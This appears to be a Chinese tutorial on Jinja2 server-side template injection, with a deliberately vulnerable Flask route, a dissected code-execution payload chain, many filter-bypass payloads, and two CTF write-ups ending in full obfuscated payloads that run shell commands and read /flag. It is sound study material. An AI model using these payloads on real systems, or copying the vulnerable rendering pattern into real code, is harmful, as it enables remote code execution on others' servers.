# 基本概念

## 模板引擎

模板引擎是在 Web 开发中，为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，模板引擎会将模板文件和数据通过引擎整合生成最终的HTML代码并用于展示。  
模板引擎的底层逻辑就是进行字符串拼接。模板引擎利用正则表达式识别模板占位符，并用数据替换其中的占位符。

## SSTI

SSTI（Server-Side Template Injection）服务端模板注入主要是 Python 的一些框架，如 jinja2、mako、tornado、django，PHP 框架 smarty、twig，Java 框架 jade、velocity 等等使用渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。

## Jinja2

Jinja2 是一种面向Python的现代和设计友好的模板语言，它是以Django的模板为模型的。  
Jinja2 是 Flask 框架的一部分。Jinja2 会把模板参数提供的相应的值替换了 `{{…}}` 块。  
Jinja2 模板同样支持控制语句，像在 `{%…%}` 块中。

> 控制结构 {% %} 可以声明变量，也可以执行语句  
> 变量取值 {{ }} 用于将表达式打印到模板输出  
> 注释块 {# #} 用于注释

## Python基础

当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。`__builtins__` 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。  
Python语言实现为部分对象类型添加了一些特殊的只读属性，它们具有各自的作用。其中一些并不会被 `dir()` 内置函数所列出。

> __class__  
>   查看对象所在的类  
> __mro__  
>   查看继承关系和调用顺序，返回元组  
> __base__  
>   返回基类  
> __bases__  
>   返回基类元组  
> __subclasses__()  
>   返回子类列表  
> __init__  
>   调用初始化函数，可以用来跳到__globals__  
> __globals__  
>   返回函数所在的全局命名空间所定义的全局变量，返回字典  
> __builtins__  
>   返回内建内建名称空间字典  
> __dic__  
>   返回类的静态函数、类函数、普通函数、全局变量以及一些内置的属性  
> __getattribute__()  
>   实例、类、函数都具有的魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx() 都会自动去调用此方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。  
> __getitem__()  
>   调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')  
> __builtins__  
>   内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。  
> __import__  
>   动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]  
> __str__()  
>   返回描写这个对象的字符串，可以理解成就是打印出来。  
> url_for  
>   flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app  
> get_flashed_messages  
>   flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app  
> lipsum  
>   flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}} {{cycler.__init__.__globals__.os.popen('ls').read()}}  
> current_app  
>   应用上下文，一个全局变量  
> request  
>   可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()  
> request.args.x1  
>   get传参  
> request.values.x1  
>   所有参数  
> request.cookies  
>   cookies参数  
> request.headers  
>   请求头参数  
> request.form.x1  
>   post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)  
> request.data  
>   post传参(Content-Type:a/b)  
> request.json  
>   post传json(Content-Type:application/json)  
> config  
>   当前application的所有配置。此外，也可以{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

# 漏洞原理

## 代码复现

如以下代码：

```python
from flask import Flask, render_template, request, render_template_string

app = Flask(__name__)


@app.route('/ssti', methods=['GET', 'POST'])
def sb():
    template = '''
        <div class="center-content error">
            <h1>This is ssti! %s</h1>
        </div>
    ''' % request.args["x"]

    return render_template_string(template)


if __name__ == '__main__':
    app.debug = True
    app.run()
```

模板文件接收了名为`x`的传入参数，并且将参数值回显到页面上。  
启动服务，手动传入参数，可以看到功能正常，其中参数`x`的值完全可控：

[![](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220908111601153-1640426204.png)](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220908111601153-1640426204.png)

尝试写入 Jinja2 的模板语言，发现模板引擎成功解析。说明模板引擎并不是将我们输入的值当作字符串，而是当作代码执行了。

[![](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220908111634928-1265252920.png)](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220908111634928-1265252920.png)

那么，攻击者就可以通过精心构造恶意的 Payload 来让服务器执行任意代码，造成严重危害。下图通过 SSTI 命令执行成功执行 whoami 命令：

[![](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220908111751037-1868071251.png)](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220908111751037-1868071251.png)

## Payload解析

先上Payload：

```python
{{''.__class__.__base__.__subclasses__()[1].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

下面分步对每一步代码进行分析：

1. 首先考虑拿到一个class，通过字符串、元组、列表、字典均可。

```python
{{''.__class__}}
# <class 'str'>
{{().__class__}}
# <type 'tuple'>
{{[].__class__}}
# <type 'list'>
{{{}.__class__}}
# <type 'dict'>
```

2. 下一步目的是拿到object基类。

```python
{{''.__class__.__base__}}
# <class 'object'>
```

3. 然后获取对应子类。

```python
{{''.__class__.__base__.__subclasses__()}}
# [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, ...
```

4. 在所有的子类中选择一个可用的类，去获取__globals__全局变量。如果这些函数并没有被重载，这时他们并不是function，不具有__globals__属性。

```python
{{''.__class__.__base__.__subclasses__()[128]}}
# <class 'os._wrap_close'>
```

5. 通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量。

```python
{{''.__class__.__base__.__subclasses__()[128].__init__}}
# <function _wrap_close.__init__ at 0x00000221629F5048>

{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__}}
# ..., 'eval': <built-in function eval>, ...
```

6. 再获取到__globals__全局变量里的__builtins__中的eval函数。

```python
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']}}
# {'__name__': 'builtins', '__doc__': ...

{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']}}
# <built-in function eval>
```

7. 使用popen命令执行即可。

```python
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("whoami").read()')}}
# root
```

# 常规绕过姿势

## 其他Payload

1. 获取基类  
    `__bases__`方法用来查看某个类的基类，也可以使用数组索引来查看特定位置的值。通过该属性可以查看该类的所有直接父类。获取基类还能用`__mro__`方法，该方法可以用来获取一个类的调用顺序。也可以利用`__base__`方法获取直接基类。

```python
{{''.__class__.__bases__}}
# (<class 'object'>,)
{{''.__class__.__bases__[0]}}
# <class 'object'>
{{''.__class__.__mro__}}
# (<class 'str'>, <class 'object'>)
{{''.__class__.__base__}}
# <class 'object'>
```

2. 执行命令

```python
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['os'].popen('ls /').read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
{{''.__class__.__base__.__subclasses__()[128]["load_module"]("os")["popen"]("ls /").read()}}
{{''.__class__.__base__.__subclasses__()[128].__init__.__globals__['linecache']['os'].popen('ls /').read()}}
{{''.__class__.__base__.__subclasses__()[128]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}
# root
```

## 过滤关键字

绕过对双引号里关键字的限制，比如{{''.__class__}}，如果过滤_或class关键字

1. 16进制编码  
    {{''.__class__}}等价于{{''["__class__"]}}，所以可以将其中关键字编码或者部分编码，如

```python
{{''["\x5f\x5f\x63las\x73\x5f\x5f"]}}
```

2. 使用unicode编码（适用于Flask

```python
{{''["\u005f\u005fclas\u0073\u005f\u005f"]}}
```

3. 使用字符串拼接、引号绕过，在Jinjia2中加号可以省略

```python
{{''["__clas"+"s__"]}}
{{''["__clas""s__"]}}
```

4. 使用base64编码（适用于Python2）

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA=='.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3Blbigid2hvYW1pIikucmVhZCgp'.decode('base64'))}}
```

5. 使用join()函数绕过，比如过滤了flag关键字

```python
[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
```

## 过滤中括号

1. 使用__getitem__函数即可，它的作用是从__getitem__(i)等价于[i]获取第i个元素，因此可以替换，如

```python
{{''.__class__.__mro__.__getitem__(1)}}
```

2. 使用pop函数也可以

```python
{{''.__class__.__mro__.__getitem__(1).__subclasses__().pop(80)}}
```

3. 使用.来访问

```python
{{''.__class__.__mro__.__getitem__(1).__subclasses__()[80].__init__.__globals__.__builtins__}}
```

## 过滤下划线

1. 使用request对象。Flask可以有以下参数

> form  
> args  
> values  
> cookies  
> stream  
> headers

```python
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[80]('/flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
{{()[request.args.class][request.args.bases][0][request.args.subclasses]()[80].__init__.__globals__['os'].popen('whoami').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__
```

## 过滤点.

1. 使用中括号来互换

```python
{{''.__class__}}
{{''["__class__"]}}
{{''|attr("__class__")}}
```

2. 也可以使用原生 JinJa2 的 `attr()` 函数，如

```python
{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(80)|attr("__init__")|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("eval")('__import__("os").popen("whoami").read()')}}
```

## 过滤花括号{

1. 如果题目直接把{{}}过滤了，可以考虑使用Flask模板的另一种形式{%%}装载一个循环控制语句来绕过

```python
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__=='_IterationGuard' %}
{{ c.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()") }}
{% endif %}
{% endfor %}
```

2. 也可以使用`{% if ... %}1{% endif %}`配合 os.popen 和 curl 将执行结果外带（不外带的话无回显）

```python
{% if ''.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen('whoami') %}1{% endif %}
```

3. 也可以用`{%print(......)%}`的形式来代替`{{}}`

```python
{%print(''.__class__.__base__.__subclasses__()[80].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()"))%}
```

## 使用 Jinja2 过滤器绕过

在 JinJa2 中内置了很多过滤器，变量可以通过过滤器进行修改，过滤器与变量之间用管道符号`|`隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号`|`连接多个过滤器，一个过滤器的输出应用于下一个过滤器。  
内置过滤器列表如下：

|   |   |   |   |   |
|---|---|---|---|---|
|abs()|forceescape()|map()|select()|unique()|
|attr()|format()|max()|selectattr()|upper()|
|batch()|groupby()|min()|slice()|urlencode()|
|capitalize()|indent()|pprint()|sort()|urlize()|
|center()|int()|random()|string()|wordcount()|
|default()|items()|reject()|striptags()|wordwrap()|
|dictsort()|join()|rejectattr()|sum()|xmlattr()|
|escape()|last()|replace()|title()|filesizeformat()|
|length()|reverse()|tojson()|first()|list()|
|round()|trim()|float()|lower()|safe()|
|truncate()|

其中常见过滤器用法如下：

> abs()  
>   返回参数的绝对值。  
> attr()  
>   获取对象的属性。foo|attr("bar") 等价于 foo.bar  
> capitalize()  
>   第一个字符大写，所有其他字符小写。  
> first()  
>   返回序列的第一项。  
> float()  
>   将值转换为浮点数。如果转换不起作用将返回 0.0。  
> int()  
>   将值转换为整数。如果转换不起作用将返回 0。  
> items()  
>   返回一个迭代器(key, value)映射项。

其他用法详见官方文档：

[Template Designer Documentation - Jinja Documentation (3.2.x)](https://jinja.palletsprojects.com/en/latest/templates/#list-of-builtin-filters)

使用过滤器构造Payload，一般思路是利用这些过滤器，逐步拼接出需要的字符、数字或字符串。对于一般原始字符的获取方法有以下几种：

```python
{% set org = ({ }|select()|string()) %}{{org}}
# <generator object select_or_reject at 0x0000020B2CA4EA20>
{% set org = (self|string()) %}{{org}}
# <TemplateReference None>
{% set org = self|string|urlencode %}{{org}}
# %3CTemplateReference%20None%3E
{% set org = (app.__doc__|string) %}{{org}}
# Hello The default undefined type.  This undefined type can be printed and
#    iterated over, but every other access will raise an :exc:`UndefinedError`:
#
#     >>> foo = Undefined(name='foo')
#     >>> str(foo)
#     ''
#     >>> not foo
#     True
#     >>> foo + 42
#     Traceback (most recent call last):
#       ...
#     jinja2.exceptions.UndefinedError: 'foo' is undefined
{% set num = (self|int) %}{{num}}
# 0
{% set num = (self|string|length) %}{{num}}
# 24
{% set point = self|float|string|min %}{{point}}
# .
```

通过以上几种Payload，返回的字符串中包含尖括号、字母、空格、下划线、数字、空格、百分号、点号。  
我们的目标就是使用这些返回的字符串，结合各种过滤器，拼接出最终的Payload。

# 实战例题

## [网络安全管理员职业技能大赛]EZSS

进入页面，发现提示please get pid，尝试GET传参，发现回显参数值到页面了。  
结合题目名称以及返回报文头的Server信息，初步判断是一道SSTI题目。

经过尝试，题目过滤了`{{}}`，使用`{%print %}`来绕过，说明存在SSTI漏洞。

```bash
?pid={%print 7*7%}
```

[![](https://img-blog.csdnimg.cn/92f24a618bbd43a7814dd4cadfb43d0d.png)](https://img-blog.csdnimg.cn/92f24a618bbd43a7814dd4cadfb43d0d.png)  
题目还过滤了`.`，使用多个参数传入`[request["args"]["a"]]`来绕过，因为题目的过滤规则只对pid参数生效，我们把关键通过别的参数传入，再将参数值进行拼接即可。

查看可用的类：

```bash
?pid={%print+()[request["args"]["a"]][request["args"]["b"]][0][request["args"]["c"]]()%}&a=__class__&b=__bases__&c=__subclasses__
```

[![](https://img-blog.csdnimg.cn/83cb66e3fc6b4650b7607a3d7f31e34a.png)](https://img-blog.csdnimg.cn/83cb66e3fc6b4650b7607a3d7f31e34a.png)

执行命令并读取flag即可：

```bash
{%print ()[request["args"]["a"]][request["args"]["b"]][0][request["args"]["c"]]()[146]('whoami',shell=True,stdout=-1)["stdout"]["readlines"]() %}&a=__class__&b=__bases__&c=__subclasses__&d=__init__&f=communicate
```

[![](https://img-blog.csdnimg.cn/cfb22eb2d2f544b1b0ad1775d0b432e1.png)](https://img-blog.csdnimg.cn/cfb22eb2d2f544b1b0ad1775d0b432e1.png)

## [Dest0g3 520迎新赛]EasySSTI

进入题目是一个登录框，点击登录可以回显用户名，经过尝试发现存在SSTI：

[![](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220914105747423-959995265.png)](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220914105747423-959995265.png)

经过Fuzz，发现过滤了 `_.'"[]`等字符，还有各种class、request、eval等关键字。  
需要注入也就是需要程序执行的代码如下：

```python
__import__('os').popen('cat /flag').read()
```

通过过滤器构造payload：

```python
{% set zero = (self|int) %}
{% set one = (zero**zero)|int %}
{% set two = (zero-one-one)|abs %}
{% set four = (two*two)|int %}
{% set five = (two*two*two)-one-one-one %}
{% set three = five-one-one %}
{% set nine = (two*two*two*two-five-one-one) %}
{% set seven = (zero-one-one-five)|abs %}
{% set space = self|string|min %}
{% set point = self|float|string|min %}
{% set c = dict(c=aa)|reverse|first %}
{% set bfh = self|string|urlencode|first %}
{% set bfhc = bfh~c %}
{% set slas = bfhc%((four~seven)|int) %}
{% set yin = bfhc%((three~nine)|int) %}
{% set xhx = bfhc%((nine~five)|int) %}
{% set right = bfhc%((four~one)|int) %}
{% set left = bfhc%((four~zero)|int) %}
{% set but = dict(buil=aa,tins=dd)|join %}
{% set imp = dict(imp=aa,ort=dd)|join %}
{% set pon = dict(po=aa,pen=dd)|join %}
{% set so = dict(o=aa,s=dd)|join %}
{% set ca = dict(ca=aa,t=dd)|join %}
{% set ls = dict(ls=x)|join %}
{% set ev = dict(ev=aa,al=dd)|join %}
{% set red = dict(re=aa,ad=dd)|join %}
{% set bul = xhx~xhx~but~xhx~xhx %}
{% set ini = dict(ini=aa,t=bb)|join %}
{% set glo = dict(glo=aa,bals=bb)|join %}
{% set itm = dict(ite=aa,ms=bb)|join %}
{% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~(dict(flag=1)|join)~yin~right~point~red~left~right %}
{% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %}
    {% if f == bul %}
        {% for a,b in (v|attr(itm))() %}
            {% if a == ev %}
                {{b(pld)}}
            {% endif %}
        {% endfor %}
    {% endif %}
{% endfor %}
```

空格绕过一般可以考虑以下：

> %20  
> %09  
> %0a  
> %0b  
> %0c  
> %0d  
> %a0  
> %00

本题可以使用`%0c`绕过，最终Payload如下：

```python
username={%%0cset%0czero%0c=%0c(self|int)%0c%}{%%0cset%0cone%0c=%0c(zero**zero)|int%0c%}{%%0cset%0ctwo%0c=%0c(zero-one-one)|abs%0c%}{%%0cset%0cfour%0c=%0c(two*two)|int%0c%}{%%0cset%0cfive%0c=%0c(two*two*two)-one-one-one%0c%}{%%0cset%0cthree%0c=%0cfive-one-one%0c%}{%%0cset%0cnine%0c=%0c(two*two*two*two-five-one-one)%0c%}{%%0cset%0cseven%0c=%0c(zero-one-one-five)|abs%0c%}{%%0cset%0cspace%0c=%0cself|string|min%0c%}{%%0cset%0cpoint%0c=%0cself|float|string|min%0c%}{%%0cset%0cc%0c=%0cdict(c=aa)|reverse|first%0c%}{%%0cset%0cbfh%0c=%0cself|string|urlencode|first%0c%}{%%0cset%0cbfhc%0c=%0cbfh~c%0c%}{%%0cset%0cslas%0c=%0cbfhc%((four~seven)|int)%0c%}{%%0cset%0cyin%0c=%0cbfhc%((three~nine)|int)%0c%}{%%0cset%0cxhx%0c=%0cbfhc%((nine~five)|int)%0c%}{%%0cset%0cright%0c=%0cbfhc%((four~one)|int)%0c%}{%%0cset%0cleft%0c=%0cbfhc%((four~zero)|int)%0c%}{%%0cset%0cbut%0c=%0cdict(buil=aa,tins=dd)|join%0c%}{%%0cset%0cimp%0c=%0cdict(imp=aa,ort=dd)|join%0c%}{%%0cset%0cpon%0c=%0cdict(po=aa,pen=dd)|join%0c%}{%%0cset%0cso%0c=%0cdict(o=aa,s=dd)|join%0c%}{%%0cset%0cca%0c=%0cdict(ca=aa,t=dd)|join%0c%}{%%0cset%0cls%0c=%0cdict(ls=x)|join%0c%}{%%0cset%0cev%0c=%0cdict(ev=aa,al=dd)|join%0c%}{%%0cset%0cred%0c=%0cdict(re=aa,ad=dd)|join%0c%}{%%0cset%0cbul%0c=%0cxhx~xhx~but~xhx~xhx%0c%}{%%0cset%0cini%0c=%0cdict(ini=aa,t=bb)|join%0c%}{%%0cset%0cglo%0c=%0cdict(glo=aa,bals=bb)|join%0c%}{%%0cset%0citm%0c=%0cdict(ite=aa,ms=bb)|join%0c%}{%%0cset%0cpld%0c=%0cxhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~slas~(dict(flag=1)|join)~yin~right~point~red~left~right%0c%}{%%0cfor%0cf,v%0cin%0c(self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))()%0c%}{%%0cif%0cf%0c==%0cbul%0c%}{%%0cfor%0ca,b%0cin%0c(v|attr(itm))()%0c%}{%%0cif%0ca%0c==%0cev%0c%}{{b(pld)}}{%%0cendif%0c%}{%%0cendfor%0c%}{%%0cendif%0c%}{%%0cendfor%0c%}&password=admin
```

[![](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220914143508629-1153751208.png)](https://img2022.cnblogs.com/blog/2957280/202209/2957280-20220914143508629-1153751208.png)